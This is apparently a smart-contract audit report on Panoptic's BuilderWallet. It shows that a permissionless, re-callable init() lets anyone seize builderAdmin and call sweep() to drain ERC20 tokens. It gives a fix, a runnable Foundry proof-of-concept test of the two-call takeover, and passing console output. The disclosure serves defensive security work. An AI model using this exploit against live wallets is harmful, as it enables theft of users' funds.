  "body": "## Vulnerability details\n\n### Finding description\n\nWhile analyzing `contracts/RiskEngine.sol`, I observed that `BuilderWallet` uses an external `init()` function to set the privileged `builderAdmin`, but `init()` is **permissionless** and **re-initializable**:\n\n~~~solidity\nfunction init(address _builderAdmin) external {\n    builderAdmin = _builderAdmin;\n}\n~~~\n\nThe same wallet exposes a `sweep(token, to)` function that transfers the wallet’s entire ERC20 balance to an arbitrary address, gated solely by `builderAdmin`:\n\n~~~solidity\nfunction sweep(address token, address to) external {\n    if (msg.sender != builderAdmin) revert Errors.NotBuilder();\n    IERC20Partial(token).transfer(to, IERC20Partial(token).balanceOf(address(this)));\n}\n~~~\n\nBecause `init()` has **no access control** and **no one-time initialization guard**, any attacker can overwrite `builderAdmin` at any time and immediately call `sweep()` to drain any ERC20 held by the wallet.\n\n### Why this matters here :\n\n`RiskEngine` computes a builder fee recipient derived from a **builder wallet address** (builderCode → `_computeBuilderWallet(builderCode)` → fee recipient). Builder wallets are therefore intended to custody value (e.g., CollateralTracker share tokens / builder-related ERC20 balances). Once a builder wallet accumulates any ERC20 balance, an attacker can steal it with two calls:\n\n1) `BuilderWallet.init(attacker)`  \n2) `BuilderWallet.sweep(token, attacker)`\n\n### Impact\n\n- **Direct theft** of any ERC20 held by builder wallets (including CollateralTracker share tokens).\n- **No privileges required**; takeover is a single permissionless call.\n- Any deployed/funded builder wallet can be drained.\n\n---\n\n## Recommended mitigation steps\n\nRestrict initialization and make it one-time:\n\n~~~solidity\nfunction init(address _builderAdmin) external {\n    require(msg.sender == FACTORY, \"NOT_FACTORY\");\n    require(builderAdmin == address(0), \"ALREADY_INIT\");\n    require(_builderAdmin != address(0), \"ZERO_ADMIN\");\n    builderAdmin = _builderAdmin;\n}\n~~~\n\nAlternative: set `builderAdmin` in the constructor (remove external `init`) or use a standard initializer pattern with an “only-once” guard.\n\n---",
  "proof_of_concept": "## Proof of Concept (PoC)\n\nI have written a runnable PoC  using in-scope Panoptic contracts (`BuilderFactory`, `BuilderWallet`, `CollateralTracker`, `PanopticPool`, `RiskEngine`). \n\nMy PoC demonstrates theft of **real CollateralTracker share tokens**, minted via `CollateralTracker.deposit()` (real protocol logic), then drained via the `init()` takeover + `sweep()`.\n\n### What the PoC does (and what it proves)\n\n1. Deploys a `BuilderWallet` via `BuilderFactory` with a legitimate `builderAdmin`.\n2. Deploys a real `CollateralTracker` (in-scope) and initializes it.\n3. Mints **actual CollateralTracker shares** to the `BuilderWallet` by:\n   - minting an underlying ERC20 to the wallet, then\n   - calling `CollateralTracker.deposit()` from the wallet to receive share tokens.\n4. Shows the attacker **cannot** call `sweep()` before takeover (reverts with `NotBuilder`).\n5. Attacker calls `BuilderWallet.init(attacker)` to overwrite `builderAdmin`.\n6. Attacker calls `BuilderWallet.sweep(address(collateralTracker), attacker)` to transfer the wallet’s **CollateralTracker share balance** to the attacker.\n\nThis proves that `init()` being permissionless and re-initializable allows full takeover of the wallet and theft of any ERC20 held by it (including CollateralTracker shares).\n\n### File path\n\n`test/foundry/poc/BuilderWalletInitTakeover.t.sol`\n\n### How to run\n\n~~~bash\nforge test \\\n  --fork-url https://ethereum.publicnode.com \\\n  --match-path test/foundry/poc/BuilderWalletInitTakeover.t.sol \\\n  -vv --jobs 1\n~~~\n\n### PoC code\n\n~~~solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\n\nimport {PanopticPool} from \"@contracts/PanopticPool.sol\";\nimport {ISemiFungiblePositionManager} from \"@contracts/interfaces/ISemiFungiblePositionManager.sol\";\nimport {CollateralTracker} from \"@contracts/CollateralTracker.sol\";\nimport {RiskEngine, BuilderFactory, BuilderWallet} from \"@contracts/RiskEngine.sol\";\n\nimport {Errors} from \"@libraries/Errors.sol\";\nimport {ERC20S} from \"../testUtils/ERC20S.sol\";\nimport {ClonesWithImmutableArgs} from \"clones-with-immutable-args/ClonesWithImmutableArgs.sol\";\n\n/// PoC: BuilderWallet.init() is permissionless + re-initializable.\n/// Attacker overwrites builderAdmin and sweeps real CollateralTracker share tokens.\ncontract BuilderWalletInitTakeover is Test {\n    function test_builderWallet_takeover_drains_real_collateralTracker_shares() public {\n        address guardian = makeAddr(\"guardian\");\n        address legitBuilderAdmin = makeAddr(\"legitBuilderAdmin\");\n        address attacker = makeAddr(\"attacker\");\n\n        // 1) Deploy BuilderFactory and a BuilderWallet (real in-scope code from RiskEngine.sol)\n        BuilderFactory factory = new BuilderFactory(guardian);\n\n        vm.prank(guardian);\n        address walletAddr = factory.deployBuilder(uint48(123), legitBuilderAdmin);\n        BuilderWallet wallet = BuilderWallet(walletAddr);\n\n        // 2) Deploy RiskEngine (real in-scope contract; builderFactory not needed for this PoC)\n        RiskEngine riskEngine = new RiskEngine(10_000_000, 10_000_000, address(0), address(0));\n\n        // 3) Deploy a minimal PanopticPool (real in-scope contract) for CollateralTracker's gating calls.\n        // We do not initialize it; CollateralTracker only needs numberOfLegs() to exist.\n        PanopticPool dummyPool = new PanopticPool(ISemiFungiblePositionManager(address(0x1234)));\n\n        // 4) Deploy underlying tokens (external to protocol in production; using repo test ERC20)\n        ERC20S token0 = new ERC20S(\"Token0\", \"T0\", 18);\n        ERC20S token1 = new ERC20S(\"Token1\", \"T1\", 18);\n\n        // 5) Deploy a real CollateralTracker clone (in-scope) in \"V3 mode\" (poolManager = address(0))\n        CollateralTracker ctImpl = new CollateralTracker(10);\n\n        CollateralTracker collateral = CollateralTracker(\n            ClonesWithImmutableArgs.clone2(\n                address(ctImpl),\n                abi.encodePacked(\n                    address(dummyPool),   // panopticPool\n                    true,                 // underlyingIsToken0\n                    address(token0),       // underlyingToken\n                    address(token0),       // token0\n                    address(token1),       // token1\n                    address(riskEngine),   // riskEngine\n                    address(0),            // poolManager (0 => V3-mode; no v4 unlock callback)\n                    uint24(0)              // poolFee (unused for this PoC)\n                )\n            )\n        );\n        collateral.initialize();\n\n        // 6) Mint REAL CollateralTracker shares to the BuilderWallet via deposit()\n        // This matches the real asset class builders receive (CollateralTracker shares are ERC20s).\n        uint256 assets = 1_000 ether;\n        token0.mint(walletAddr, assets);\n\n        vm.startPrank(walletAddr);\n        token0.approve(address(collateral), type(uint256).max);\n        collateral.deposit(assets, walletAddr);\n        vm.stopPrank();\n\n        uint256 shareBal = collateral.balanceOf(walletAddr);\n        assertGt(shareBal, 0, \"builder wallet should hold CT shares after deposit\");\n\n        // 7) Attacker cannot sweep before takeover\n        vm.prank(attacker);\n        vm.expectRevert(Errors.NotBuilder.selector);\n        wallet.sweep(address(collateral), attacker);\n\n        // 8) Takeover (BUG): init() is permissionless + re-initializable\n        vm.prank(attacker);\n        wallet.init(attacker);\n        assertEq(wallet.builderAdmin(), attacker);\n\n        // 9) Drain: attacker steals the real CollateralTracker share token\n        vm.prank(attacker);\n        wallet.sweep(address(collateral), attacker);\n\n        assertEq(collateral.balanceOf(walletAddr), 0);\n        assertEq(collateral.balanceOf(attacker), shareBal);\n    }\n}\n\n~~~\n\n## My Console output log :\n\n     $ forge test \\\n       --fork-url https://ethereum.publicnode.com \\\n       --match-path test/foundry/poc/BuilderWalletInitTakeover.t.sol \\\n       -vv --jobs 1\n     [⠒] Compiling...\n     No files changed, compilation skipped\n\n     Ran 1 test for test/foundry/poc/BuilderWalletInitTakeover.t.sol:BuilderWalletInitTakeover\n     [PASS] test_builderWallet_takeover_drains_real_collateralTracker_shares() (gas: 17466240)\n     Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.71s (2.03s CPU time)\n\n     Ran 1 test suite in 4.29s (3.71s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)",
